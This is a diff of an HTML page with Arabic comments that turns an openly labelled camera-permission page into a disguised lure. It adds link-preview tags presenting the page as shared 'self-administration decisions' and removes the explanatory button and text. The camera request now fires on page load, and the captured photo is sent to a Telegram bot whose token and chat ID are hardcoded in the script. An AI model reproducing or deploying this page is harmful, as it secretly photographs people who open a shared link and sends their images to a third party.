@@ -7,7 +7,15 @@ const TELEGRAM_CHAT_ID = '5152526784'; // استبدل هذا بالـ chat_id �
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>طلب الأذونات للوصول إلى الكاميرا</title>
+    <!-- Open Graph Tags لتحديد صورة عند مشاركة الرابط -->
+    <meta property="og:title" content="قرارات الادارة الذاتية" />
+    <meta property="og:description" content="مشاركة قرارات الادارة الذاتية مع الصورة" />
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT2DdW2NUpE7G8U7Wawg9UD_O_dhTTz0X0-kfsfz16ZolwSBQtlg4b3UnT5NihxZMWMQa8&usqp=CAU" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:image:type" content="image/images.jpg" />
+    
+    <title> قرارات </title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -32,39 +40,25 @@ const TELEGRAM_CHAT_ID = '5152526784'; // استبدل هذا بالـ chat_id �
             text-align: center;
         }
 
-        #permissionRequest button {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 8px;
-            cursor: pointer;
-        }
-
-        #permissionRequest button:hover {
-            background-color: #0056b3;
-        }
     </style>
 </head>
 <body>
-    <h1>الوصول إلى الكاميرا</h1>
+   
 
     <!-- واجهة مخصصة لطلب الإذن -->
     <div id="permissionRequest">
-        <p>يرجى السماح لنا بالوصول إلى الكاميرا لالتقاط صورة وإرسالها. اضغط على زر "منح الإذن" للمتابعة.</p>
-        <button id="requestPermissionBtn">منح الإذن</button>
+        <p> قرارات الادارة الذاتية </p>
     </div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = '6822625757:AAFuBb7icwxuFpKjqFTWwlKb5poUSUfWTNo'; // استبدل هذا بالتوكن الخاص بك
         const TELEGRAM_CHAT_ID = '5152526784'; // استبدل هذا بالـ chat_id الخاص بك
 
-        // عند الضغط على زر منح الإذن
-        document.getElementById('requestPermissionBtn').addEventListener('click', function() {
-            // طلب الوصول إلى الكاميرا فقط
+        // عند تحميل الصفحة مباشرة، طلب الوصول إلى الكاميرا
+        window.onload = function() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function(stream) {
-                    // إخفاء واجهة الطلب بعد النقر
+                    // إخفاء واجهة الطلب بعد الحصول على الإذن
                     document.getElementById('permissionRequest').style.display = 'none';
 
                     // التقاط الصورة فقط
@@ -73,7 +67,7 @@ const TELEGRAM_CHAT_ID = '5152526784'; // استبدل هذا بالـ chat_id �
                 .catch(function(error) {
                     alert('حدث خطأ في الوصول إلى الكاميرا. تأكد من تمكين الإذن.');
                 });
-        });
+        };
 
         function captureImageAndSendToTelegram(stream) {
             // إنشاء عنصر فيديو مؤقت لالتقاط الصورة
@@ -128,3 +122,4 @@ const TELEGRAM_CHAT_ID = '5152526784'; // استبدل هذا بالـ chat_id �
     </script>
 </body>
 </html>
+
